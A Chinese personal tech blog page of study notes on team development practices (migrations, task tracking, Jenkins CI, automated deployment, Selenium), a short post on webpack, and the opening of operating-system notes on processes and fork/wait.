<li>格式为文件</li>
</ul>
<h4 id="数据库迁移"><a href="#数据库迁移" class="headerlink" title="数据库迁移"></a>数据库迁移</h4><p>基本原理：将数据库初始化需要用的 SQL 命令写入文件，这些文件按数字进行顺序命令，每次启动程序时，按照这些文件进行数据库初始化；</p>
<p>由于是分布式开发，每个开发人员新添加的 SQL 文件可能存在命名冲突，当合并分支时，Git 会报错，此时需要解决冲突，并再次提效修改后的版本；由于修改后的版本是最新版本，因此其他人在合并该版本时，会自动覆盖其本地的版本，因此，仍然能够实现正确的初始化；</p>
<p>SQL 文件中的初始化命令是成对出现的，它提供了回滚机制，当出现冲突时，先回滚当前的数据库，再按照最新的版本，重新初始化；</p>
<p>由于冲突是通过手工合并 SQL 命令来解决的，因此不可避免存在错误的可能性，此时就需要通过增加测试代码，来确保万无一失；</p>
<h3 id="配置文件的管理"><a href="#配置文件的管理" class="headerlink" title="配置文件的管理"></a>配置文件的管理</h3><p>配置文件包括环境变量、密码等信息，这些信息不适合纳入版本管理，因此需要单独上传部署的服务器，此时可以通过编写一个部署脚本，来实现自动上传；而上传的信息，同样可以写在配置文件中，而脚本本身可以纳入版本管理；</p>
<p>常用部署的工具：Chef, Puppet, Capistrano, Fabric, ServerSepc；</p>
<h3 id="依赖关系的管理"><a href="#依赖关系的管理" class="headerlink" title="依赖关系的管理"></a>依赖关系的管理</h3><p>大多数语言都有自己的依赖管理工具和公共仓库，例如 Java 的 Maven，Node 的 npm，Python 的 Pypi 等；</p>
<p>这些现成的工具的原理：</p>
<ul>
<li>设置一个中央仓库；</li>
<li>使用一个文件来定义对库的依赖；</li>
<li>执行上述依赖文件的脚本；</li>
</ul>
<h2 id="4-任务管理"><a href="#4-任务管理" class="headerlink" title="4. 任务管理"></a>4. 任务管理</h2><h4 id="任务管理系统的优点"><a href="#任务管理系统的优点" class="headerlink" title="任务管理系统的优点"></a>任务管理系统的优点</h4><ul>
<li>“有须做什么”的任务定义</li>
<li>“谁来做”的职责分配</li>
<li>“什么时候完成”的期限管理</li>
<li>“作业中或已完成”的状态管理</li>
</ul>
<h4 id="其他优点"><a href="#其他优点" class="headerlink" title="其他优点"></a>其他优点</h4><ul>
<li>直观性</li>
<li>方便检索</li>
<li>对信息统一管理及共享</li>
<li>能够生成各类报表</li>
<li>能够与其他系统进行关联，具备可扩展性；</li>
</ul>
<h4 id="任务驱动开发"><a href="#任务驱动开发" class="headerlink" title="任务驱动开发"></a>任务驱动开发</h4><p>将新功能或者 BUG 任务登记在缺陷管理系统中，每次代码的提交，都与某一个具体的任务单相对应，禁止没有任务单号的提交；</p>
<p>通过设置 Github 的 Webhook，可以实现将 commit 和相应的任务单进行关联；</p>
<h3 id="开发新功能、修改BUG的工作流程"><a href="#开发新功能、修改BUG的工作流程" class="headerlink" title="开发新功能、修改BUG的工作流程"></a>开发新功能、修改BUG的工作流程</h3><ul>
<li>建立任务单</li>
<li>指定责任人</li>
<li>开发</li>
<li>提交：提交的时候，记得标注对应哪个问题单号；这样可以通过问题单，查询到代码修改了哪些内容、什么时候修改的；也可以反向查询，即找到当前代码的修改，对应到哪些问题单，从而知道当时什么要做如此的修改；</li>
<li>Push 到代码库</li>
</ul>
<h3 id="管理对象"><a href="#管理对象" class="headerlink" title="管理对象"></a>管理对象</h3><ul>
<li>epic</li>
<li>story</li>
<li>task</li>
<li>bug</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="Redmine-安装"><a href="#Redmine-安装" class="headerlink" title="Redmine 安装"></a>Redmine 安装</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&#x27;3.7&#x27;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line"></span><br><span class="line">  redmine:</span><br><span class="line">    image: redmine</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="number">8080</span>:<span class="number">3000</span></span><br><span class="line">    environment:</span><br><span class="line">      REDMINE_DB_POSTGRES: db</span><br><span class="line">      REDMINE_DB_PASSWORD: secret</span><br><span class="line">      REDMINE_DB_USERNAME: redmine</span><br><span class="line">    networks:</span><br><span class="line">      redmine-network:</span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    image: postgres</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      POSTGRES_PASSWORD: secret</span><br><span class="line">      POSTGRES_USER: redmine</span><br><span class="line">    networks:</span><br><span class="line">      redmine-network:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">  redmine-network:</span><br></pre></td></tr></table></figure>

<h4 id="Redmine-访问"><a href="#Redmine-访问" class="headerlink" title="Redmine 访问"></a>Redmine 访问</h4><p>localhost:8080</p>
<h2 id="5-CI-持续集成"><a href="#5-CI-持续集成" class="headerlink" title="5. CI 持续集成"></a>5. CI 持续集成</h2><h3 id="主要的-CI-工具"><a href="#主要的-CI-工具" class="headerlink" title="主要的 CI 工具"></a>主要的 CI 工具</h3><ul>
<li>Jenkins：插件众多，可配置性强；缺点是上手成本高；</li>
<li>Travis：需要配合 Github 使用，优点是上手简单；</li>
</ul>
<h3 id="build-工具"><a href="#build-工具" class="headerlink" title="build 工具"></a>build 工具</h3><p>以 Java 为例，常用的构建工具有：</p>
<ul>
<li>Maven：适用于新项目；</li>
<li>Ant：适用于已开发一半的项目；</li>
</ul>
<h3 id="测试代码的写法"><a href="#测试代码的写法" class="headerlink" title="测试代码的写法"></a>测试代码的写法</h3><p>常见的测试类型：</p>
<ul>
<li>单元测试</li>
<li>集成测试</li>
<li>用户验收测试</li>
<li>回归测试</li>
</ul>
<blockquote>
<p>编写测试代码是要付出时间成本的，理想的情况下当然是覆盖以上所有的测试场景；如果不允许，则应至少包括单元测试和集成测试；</p>
</blockquote>
<h3 id="棘手的测试"><a href="#棘手的测试" class="headerlink" title="棘手的测试"></a>棘手的测试</h3><ul>
<li>和外部系统有交互的测试</li>
<li>使用 mock 框架进行测试</li>
<li>使用内存数据进行测试：可避免跟数据库中的数据产生耦合；常用工具如 H2 数据库；</li>
<li>UI 相关的测试</li>
</ul>
<h3 id="Jenkins-使用流程"><a href="#Jenkins-使用流程" class="headerlink" title="Jenkins 使用流程"></a>Jenkins 使用流程</h3><ul>
<li>新建任务：一个任务对应一个项目；</li>
<li>下载代码：将 Github 代码地址与项目进行关联，并设置 Github 的 Webhook，在收到 push 请求后，调用 Jenkins 接口拉取最新的代码；</li>
<li>自动执行 Build 和测试：制作一个构建的脚本，并由 Jenkins 进行调用即可；脚本中需设置退出值，以便 Jenkins 判断任务的执行是失败还是成功；</li>
<li>统计结果并生成报表：使用 JUnitXML 形式输出报表有更好的通用性和直观性，虽然它是 JUnit 设定的格式，但其他语言也有相应的库可以生成该格式的报表；</li>
<li>统计覆盖率：常用的覆盖率统计工具有 Cobertura, Jacoco, Scct, simpleCov, Rcov 等（Cobertura 已于 2011 年停止了开发）；</li>
<li>静态分析：常用工具 Checkstyle, PMD, Findbugs等；</li>
<li>配置通知：对构建结果进行通知，选择常用插件即可，支持邮件、Twitter、IRC、XFD等；</li>
</ul>
<h3 id="构建失败的惩罚"><a href="#构建失败的惩罚" class="headerlink" title="构建失败的惩罚"></a>构建失败的惩罚</h3><p>设计一个搞笑的仪式，例如警报灯闪烁、弹射球、戴礼帽等；</p>
<p>当构建发生失败时，基于该构建的分支之后编写的代码，将需要禁止提交，直到构建修复成功为止；为了避免出现这种等待的情况，可考虑使用 Github flow 中的 pull request 流程；当收到 pull request 后会自动进行构建，如果成功，则合并到主分支；如果失败，则不合并；</p>
<p>以上功能在 Jenkins 中需要使用 Github pull request builder 插件实现；</p>
<h3 id="确保可追溯性"><a href="#确保可追溯性" class="headerlink" title="确保可追溯性"></a>确保可追溯性</h3><p>通过相应的插件，可实现 Jenkins 和 缺陷管理系统的任务单相关，并可以方便的查看每次代码提交的差异；</p>
<h2 id="6-自动化部署–持续交付"><a href="#6-自动化部署–持续交付" class="headerlink" title="6. 自动化部署–持续交付"></a>6. 自动化部署–持续交付</h2><h3 id="由谁负责"><a href="#由谁负责" class="headerlink" title="由谁负责"></a>由谁负责</h3><p>由想实施部署自动化的人着手去做即可，因此一般来说是运维人员牵头；</p>
<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul>
<li>全部团队成员都采用版本管理；</li>
<li>所有的环境使用相同的方式构建；</li>
<li>实现发布工作的自动化，并事先进行验证</li>
<li>要反复多次进行测试</li>
</ul>
<h3 id="工具链"><a href="#工具链" class="headerlink" title="工具链"></a>工具链</h3><ul>
<li>引导：服务器 OS 的配置自动化；</li>
<li>配置：服务器及中间件的配置自动化；</li>
<li>业务流程：代码部署及发布的自动化；</li>
</ul>
<h4 id="引导"><a href="#引导" class="headerlink" title="引导"></a>引导</h4><h5 id="Kickstart"><a href="#Kickstart" class="headerlink" title="Kickstart"></a>Kickstart</h5><p>原理：安装 Linux 时，给内核参数加上 ks&#x3D;&lt;…&gt; 选项，即可开启从外部设备加载配置文件，实现安装自动化；背后的本质是将安装过程中的选项，以配置文件的形式提前写好；</p>
<blockquote>
<p>仅适用于 RHEL 系统的 Linux 系统，不适用于 Debian 系列；</p>
</blockquote>
<h5 id="Vagrant"><a href="#Vagrant" class="headerlink" title="Vagrant"></a>Vagrant</h5><p>用途：用来创建和配置虚拟环境，可以最大化的利用单台机器的性能；</p>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>应用程序总是运行在一定的进程环境中，复杂的应用程序，可能涉及非常多的环境配置选项，从而带来很大的工作量；</p>
<h5 id="Chef"><a href="#Chef" class="headerlink" title="Chef"></a>Chef</h5><p>根据提前写好的配置规则（cookbooks），让服务器安装软件包和配置中间件，实现自动化；</p>
<blockquote>
<p>可以为应用服务器和数据库服务器分别编写 cookbook，这样就能够复制搭建服务器的步骤，实现批量化；</p>
</blockquote>
<h5 id="Serverspec"><a href="#Serverspec" class="headerlink" title="Serverspec"></a>Serverspec</h5><p>用途：一个测试框架，可对服务器的配置进行单元测试，确保服务器如预期的正常运行；</p>
<h4 id="最佳实践1：使用虚拟环境"><a href="#最佳实践1：使用虚拟环境" class="headerlink" title="最佳实践1：使用虚拟环境"></a>最佳实践1：使用虚拟环境</h4><ul>
<li>使用 Vagrant 创建干净的虚拟环境；（怀疑之处可考虑结合 docker 来创建虚拟环境）；</li>
<li>拉取 Chef 的 cookbook 和 Serverspec 的测试用例；</li>
<li>执行 Chef，完成服务器的配置；</li>
<li>执行 Serverspec，完成对服务器的状态测试，确保配置成功；</li>
<li>将结果反馈给 jenkins；</li>
</ul>
<blockquote>
<p>以上各个工具都有相应的替代器，因此无须局限于以上工具的使用，重点在于选择最适合团队使用的工具；</p>
</blockquote>
<h4 id="最佳实践2：使用物理机"><a href="#最佳实践2：使用物理机" class="headerlink" title="最佳实践2：使用物理机"></a>最佳实践2：使用物理机</h4><p>Kickstart + Chef + Serverspec 的组合；</p>
<blockquote>
<p>与实践1的差别在于将 Vagrant 替换为 Kickstart；</p>
</blockquote>
<h3 id="发布自动化"><a href="#发布自动化" class="headerlink" title="发布自动化"></a>发布自动化</h3><h4 id="Capistrano"><a href="#Capistrano" class="headerlink" title="Capistrano"></a>Capistrano</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201104151546.png"></p>
<p>Capistrano 使用 Push 的方式，无须在应用程序和数据库服务上面安装，只需执行服务器能够通过 SSH 登录前两种服务器即可；</p>
<h4 id="Fabric"><a href="#Fabric" class="headerlink" title="Fabric"></a>Fabric</h4><p>功能同 Capistrano，差别在于使用 Python，而非 Ruby；另外 Fabric 任务可以顺序执行，也可以并行，甚至还可以分组顺序执行，组内则是并行；相当灵活；</p>
<h4 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h4><p>Jenkins 同样可以用来实现发布的自动化，不过需要在从节点上安装 Jenkins 才行，还好只需能够 SSH 登录从节点，即可在主节点上远程进行安装；</p>
<p>相对于前面两个工具，Jenkins 的优点在于：</p>
<ul>
<li>可视化的控制台；</li>
<li>可实现发布任务的权限管理</li>
<li>可查询发布的详细历史记录；</li>
</ul>
<h4 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h4><p>组合使用 Jenkins + Fabric，这样既可以利用 Jenkins 的日志功能，又可以获得 Fabric 灵活易用的功能；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201104151632.png"></p>
<h4 id="手动部署的工具"><a href="#手动部署的工具" class="headerlink" title="手动部署的工具"></a>手动部署的工具</h4><p>如果可能，尽量所有部署工作设置为自动化；如果出现少数需要手动部署的特例，例如某台机器磁盘空间不足，则有以下工具可以使用：</p>
<ul>
<li>RLogin</li>
<li>Tera Term</li>
</ul>
<p>以上两个工具可以实现一个终端输入，在多台机器上实施相同操作的效果；</p>
<p>当机器数据很多时，有时可能存在少数几台机器的命令执行不成功，此时在执行下一条指令前，应先就上一条指令的结果进行验证，确保无误后，再执行下一条指令；</p>
<h3 id="其他相关问题"><a href="#其他相关问题" class="headerlink" title="其他相关问题"></a>其他相关问题</h3><h4 id="不中断服务的部署方法"><a href="#不中断服务的部署方法" class="headerlink" title="不中断服务的部署方法"></a>不中断服务的部署方法</h4><h5 id="蓝绿部署"><a href="#蓝绿部署" class="headerlink" title="蓝绿部署"></a>蓝绿部署</h5><p>原理：将机器分成两组，先部署其他的一组，成功后，再部署剩下的一组；</p>
<p>缺点：部署过程中会暂停一半的机器资源，会给系统带来比较大的压力，除非增加备用机器，但那样做的成功过高；</p>
<h5 id="云蓝绿部署"><a href="#云蓝绿部署" class="headerlink" title="云蓝绿部署"></a>云蓝绿部署</h5><p>原理：机器不分组，部署前增加一批新机器进行部署，部署成功后，删除旧机器；</p>
<blockquote>
<p>该方法克服了传统蓝绿部署的缺点，但会增加复杂性和出错概率，因为务必要先实现部署的自动化和自动测试；</p>
</blockquote>
<h4 id="回滚"><a href="#回滚" class="headerlink" title="回滚"></a>回滚</h4><p>部署失败不可避免，因此应随时有回滚的机制，包括代码回滚、数据库回滚两种；</p>
<blockquote>
<p>回滚时，除了回滚源代码外，还应以服务器的环境进行验证，确保可用；同时还需考虑数据库的迁移；</p>
</blockquote>
<p>数据库的回滚分为两种情况，一种是允许新数据的丢弃，一种是不允许；后一种情况比较麻烦，因此，在发布新代码前，应分成两步进行测试，先确保只更新数据库的情况下，旧代码能够顺利进行；之后再进行新代码的发布；此时如果出现问题，也只需回滚代码部分，无须回滚数据库部分；</p>
<h4 id="PasS"><a href="#PasS" class="headerlink" title="PasS"></a>PasS</h4><p>自动化部署需要花费一定的学习和时间成本，因此也有一个选项是考虑使用 PasS 服务；只需 push 代码到相应的平台，即可实现自动化部署；</p>
<h5 id="PasS-适用场景"><a href="#PasS-适用场景" class="headerlink" title="PasS 适用场景"></a>PasS 适用场景</h5><ul>
<li>没有足够资源，但希望快速推出产品，收集反馈的项目；（创新项目）</li>
<li>无法预测峰值负荷的服务；（新上线的手机游戏）</li>
<li>生命周期短的服务（例如展会）；</li>
<li>与现有产品进行配合的小项目；</li>
</ul>
<h5 id="PasS-缺点"><a href="#PasS-缺点" class="headerlink" title="PasS 缺点"></a>PasS 缺点</h5><ul>
<li>当流量很大时，费用成本出现不成比例的上升；</li>
<li>有时难以获得想要的日志进行问题分析；</li>
<li>获得的服务等级和合同约定可能不相符；</li>
</ul>
<h2 id="7-回归测试"><a href="#7-回归测试" class="headerlink" title="7. 回归测试"></a>7. 回归测试</h2><h3 id="回归测试"><a href="#回归测试" class="headerlink" title="回归测试"></a>回归测试</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201104151658.png"></p>
<h3 id="Selenium"><a href="#Selenium" class="headerlink" title="Selenium"></a>Selenium</h3><p>Selenium 并不是单个软件，而是一套工具集；</p>
<h4 id="几个常用的-Selenium-工具"><a href="#几个常用的-Selenium-工具" class="headerlink" title="几个常用的 Selenium 工具"></a>几个常用的 Selenium 工具</h4><h5 id="Selenium-IDE"><a href="#Selenium-IDE" class="headerlink" title="Selenium IDE"></a>Selenium IDE</h5><p>以 Firefox 的插件形式出现，可以录制键盘和鼠标动作，因此对于非技术人员依然非常友好；</p>
<h5 id="Selenium-Remote-Control"><a href="#Selenium-Remote-Control" class="headerlink" title="Selenium Remote Control"></a>Selenium Remote Control</h5><p>在测试脚本和浏览器之间，增加了一个服务器作为中间层；由于这个抽象层后，可以使用各种语言编写测试脚本，使得测试更加灵活，例如可以实现循环和分支等；</p>
<h5 id="Selenium-WebDriver"><a href="#Selenium-WebDriver" class="headerlink" title="Selenium WebDriver"></a>Selenium WebDriver</h5><p>出于安全考虑，主流的浏览器都会对 Javascript 的调用进行限制，WebDriver 的目标即是绕开这些限制，实现调用  OS 的原生接口；在结合 Selenium 后，推出了 Selenium2；</p>
<h4 id="制作测试用例"><a href="#制作测试用例" class="headerlink" title="制作测试用例"></a>制作测试用例</h4><p>测试由测试用例组成，多个测试用例可以组合一个测试组；测试组内部的用例是顺序执行的；而测试组之间则是并发执行的；好的测试应该能够尽量缩短测试时间，因此，应考虑将测试用例设计成可以并行测试的模式；好的测试组之间不应相互依赖；</p>
<blockquote>
<p>由于测试用例的执行是代码级别的速度，而网页的加载则跟网速有关，因此 Selenium<br>的自动化测试会容易出现失败；解决办法在于执行下一条指令前，应对上一条指令的结果进行确认；如果确认失败，应该重复上一条指令；如果确认成功，再开始执行下一条指令；</p>
</blockquote>
<h3 id="Jenkins-和-Selenium-的协作"><a href="#Jenkins-和-Selenium-的协作" class="headerlink" title="Jenkins 和 Selenium 的协作"></a>Jenkins 和 Selenium 的协作</h3><p>安装相应的插件，然后配置好相应的参数即可；</p>
<h3 id="Selenium-测试的高速化"><a href="#Selenium-测试的高速化" class="headerlink" title="Selenium 测试的高速化"></a>Selenium 测试的高速化</h3><ul>
<li>利用 Jenkins 的分布式机制，设置主从节点，通过启动多个浏览器，实现并发测试；</li>
<li>为每个浏览器客户端匹配相应的应用程序服务器，实现服务端测试的负载均衡（不太理解为什么不使用 nginx 之类的工具来实现，而是改动 hosts 文件）</li>
</ul>
<h3 id="多个应用程序版本的测试"><a href="#多个应用程序版本的测试" class="headerlink" title="多个应用程序版本的测试"></a>多个应用程序版本的测试</h3><p>通过 Jenkins 的 Parameterized Trigger plugin”插件，可实现对指定版本进行测试；</p>
<p>使用 Git 拉取相应版本的测试用例时，需要配置插件选项，为每个版本生成相应的目录，避免不同版本的测试用例混在一起；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201104151733.png"></p>
<h2 id="8-实践"><a href="#8-实践" class="headerlink" title="8. 实践"></a>8. 实践</h2><p>在 Github 上面新建一个项目<br>拉取该项目的代码到本地<br>初始化 package.json<br>npm install 安装依赖<br>简单写一些代码，实现 hello world<br>运行代码，确保顺利<br>写一些单元测试代码<br>写测试脚本<br>设置测试脚本的文件为可执行<br>推送代码到 Github<br>登录生产服务器，新增用户，安装git，拉取代码，安装依赖，运行应用<br>登录 Jenkins 服务器，新增用户，安装 Jenkins，启动 Jenkins<br>配置 jenkins，安装插件，更改密码，新建任务，配置构建脚本；<br>配置 Github 的 Webhooks，以便 push 后触发 Jenkins 的构建；<br>生成 SSH-KEY，将公钥存放到应用程序服务器，开放存放文件夹的访问权限；<br>创建部署文件夹，创建部署的自动化脚本，设置脚本为可执行</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/04/%E9%AB%98%E6%95%88%E5%9B%A2%E9%98%9F%E5%BC%80%E5%8F%91/" data-id="cm1c2i81s0061pkhp27kddghh" data-title="高效团队开发" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%BD%AF%E4%BB%B6/" rel="tag">软件</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/" rel="tag">项目管理</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-为什么需要 webpack" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/10/26/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%20webpack/" class="article-date">
  <time class="dt-published" datetime="2020-10-26T08:57:00.000Z" itemprop="datePublished">2020-10-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/10/26/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%20webpack/">为什么需要 webpack</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>在 HTML 网页中使用 js 去完成某些功能的时候，有两种处理办法：</p>
<ul>
<li>按功能划分为多个 js 文件，在适当的位置以正确的顺序引入该 js 文件（因为文件之间可能存在依赖关系）；</li>
<li>将所有功能放在一个大的 js 文件中，一次性引入；</li>
</ul>
<p>这两种方法有各自的优缺点，前者容易维护，但是多次引入需要牺牲一些性能；后者没有性能问题，但将所有 js 代码放在一个文件中，给维护和扩展增加了难度；Webpack 的出现，即是为了解决这个问题，它让我们的 js  代码可以分模块来编写，以提高可维护性；然后在正式使用时，它帮我们将多个 js 文件合成一个，这样在网页中可以一次性的引入，避免带来多次引入的性能问题； </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/10/26/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%20webpack/" data-id="cm1c2i813002qpkhphn81dtcw" data-title="为什么需要 webpack" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/" rel="tag">javascript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%BD%AF%E4%BB%B6/" rel="tag">软件</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-操作系统导论" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/09/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%AE%BA/" class="article-date">
  <time class="dt-published" datetime="2020-09-20T14:02:00.000Z" itemprop="datePublished">2020-09-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/09/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AF%BC%E8%AE%BA/">操作系统导论</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="1-操作系统介绍"><a href="#1-操作系统介绍" class="headerlink" title="1. 操作系统介绍"></a>1. 操作系统介绍</h2><h3 id="操作系统的目标"><a href="#操作系统的目标" class="headerlink" title="操作系统的目标"></a>操作系统的目标</h3><ul>
<li>对硬件进行抽象，使得对它们的调用变得简单易用；（易用）</li>
<li>对数据进行持久保存，避免丢失；（存储）</li>
<li>对程序进行隔离，避免出现隐私或安全问题；（安全）</li>
<li>持久可靠的工作，不轻易发生故障；（可靠）</li>
</ul>
<h3 id="操作系统的历史"><a href="#操作系统的历史" class="headerlink" title="操作系统的历史"></a>操作系统的历史</h3><ul>
<li>库时代：让应用程序可以通过引用库来调用硬件；缺点：应用程序的权限很大，可以无限制的访问所有硬件资源以及其上的数据，缺少安全保护机制；</li>
<li>模式时代：引入了系统调用，应用程序只跑在用户模式下，权限受到限制；系统级别的功能通过系统调用 API 来实现，调用后，系统级别的代码跑在内核模式下，拥有最高权限；限制了应用程序能够操作的范围；</li>
<li>分时时代：随着 CPU 相对 I&#x2F;O 设备和存储设备的速度越来越快，为了避免浪费 CPU 资源，引入分时共享，实现多个程序并行的机制；</li>
<li>隔离时代：为了避免程序之间相互影响，引入了虚拟内存，以便对内存进行保护；</li>
<li>现代：在小型机之后，个人计算机开始兴起，早期的 DOS 和 MacOS 并没有借鉴小型机的操作系统，走了弯路；之后开始进行调整，MacOS 借鉴了 UNIX 的思想，而微软则推出 Windows NT（此处的 NT 表示新技术，new technology），让局面得以改善；UNIX 由于版本官司，导致其发展受到阻碍，之后 Linux 借鉴了其思路，重写了代码，绕开了版权问题，并通过开源快速发展了起来；</li>
</ul>
<h2 id="2-抽象：进程"><a href="#2-抽象：进程" class="headerlink" title="2. 抽象：进程"></a>2. 抽象：进程</h2><p>操作系统其实要面临三种角色的使用者，包括个人用户、应用程序开发者、硬件设备生产商等；不同的使用者会使用不同的视角，来看待操作系统提供的功能；</p>
<h3 id="进程简介"><a href="#进程简介" class="headerlink" title="进程简介"></a>进程简介</h3><p>进程是一种 CPU 虚拟化技术，实际的物理 CPU 可能只有一个，但是通过分时共享（time sharing）技术，让不同的应用程序轮流使用 CPU，这样在应用程序的眼里，只需要将 CPU 当作自己独自拥有的并进行调用就可以了，简化了应用程序对 CPU 调用的复杂度；</p>
<blockquote>
<p>事实上应用程序根本就不发起对 CPU 的调用，而只是按顺序准备好所有的指令，等待着被 CPU 依次执行；看起来就好像 CPU 一直为其工作一样，而不是仅在需要的时候，才通过系统调用来让 CPU 为自己工作；这跟调用其他硬件设备不太一样；因为每一条指令的执行，都是需要 CPU 的，所以其实也算是持续的做 CPU 调用；</p>
<p>进程技术更像是一种执行程序的抽象，即通过创建进程来执行程序，简化了执行程序所要的一系列准备工作；</p>
</blockquote>
<h3 id="进程-API"><a href="#进程-API" class="headerlink" title="进程 API"></a>进程 API</h3><p>操作系统提供了一些进程的 API 接口，这些接口即可以被用户使用，也可以被应用程序使用；</p>
<ul>
<li>创建进程；</li>
<li>销毁进程；</li>
<li>等待进程；</li>
<li>查询进程状态；</li>
<li>暂停&#x2F;恢复进程；</li>
</ul>
<h3 id="进程创建细节"><a href="#进程创建细节" class="headerlink" title="进程创建细节"></a>进程创建细节</h3><p>当创建一个新进程时，操作系统有一系列的工作需要完成，包括创建新页表、从磁盘加载应用程序的指令到内存、为变量分配内存（栈和堆）完成初始化、更新页表的映射、分配文件描述符、开始执行应用程序的第一条指令等；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20200910085532.png"></p>
<h3 id="进程的状态"><a href="#进程的状态" class="headerlink" title="进程的状态"></a>进程的状态</h3><p>一个进程表示一个正在运行中的程序，它有三种状态：运行中、阻塞中、就绪中；当应用程序发起某些耗时较久的 I&#x2F;O 操作时，进程的状态会被置为阻塞中，直到 I&#x2F;O 操作完成的事件后，进程的状态将被更新为“就绪”，之后便可以等待调度给 CPU 继续执行余下的指令了；当然，也有可能直接从阻塞状态变成运行状态，取决于事件发生后，在操作系统中设定的调度策略）；</p>
<blockquote>
<p>进程其实还有初始、终结等两个状态，它们分别对应进程刚创建时和进程准备退出时的场景；</p>
</blockquote>
<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>操作系统在本质上也是一个程序，它除了提供接口供其他程序（进程）调用外，还同时维护跟踪着所有其他程序（进程）的状态，以实现在不同进程之间的切换；因此，它需要创建一系列的对象（结构）来保存这些信息；</p>
<blockquote>
<p> 每个进程都有一些元信息，这些信息以“结构”的形态（C 语言中的一种数据类型，类似对象），存储在内存中；当操作系统切换进程时，进程对象的某些属性将会被更新，以便后续重新运行该进程时，可以从之前停止的地方继续执行余下的指令；</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20200910091535.png"></p>
<h2 id="3-插叙：进程-API"><a href="#3-插叙：进程-API" class="headerlink" title="3. 插叙：进程 API"></a>3. 插叙：进程 API</h2><h3 id="fork-系统调用"><a href="#fork-系统调用" class="headerlink" title="fork() 系统调用"></a>fork() 系统调用</h3><p>fork 调用会创建一个子进程，子进程会完全拷贝父进程的一切东西，并且是从调用处的指令开始往下执行剩下的代码，而不是从头开始执行所有代码；这个时候系统中有两个一模一样的进程了，区别只在于父进程的 fork 调用，其返回值是子进程的 pid， 而子进程的 fork 调用返回值是 0（如果调用成功的话）；根据这个返回值，我们就可以区分当前是在哪个进程中，并在接下来运行不同的代码；</p>
<h3 id="wait-系统调用"><a href="#wait-系统调用" class="headerlink" title="wait() 系统调用"></a>wait() 系统调用</h3><p>wait 函数可用来控制当前进程的执行进入阻塞状态，一直等到自己的子进程执行完毕后，再从暂停的地方重新开始执行自己的代码；</p>
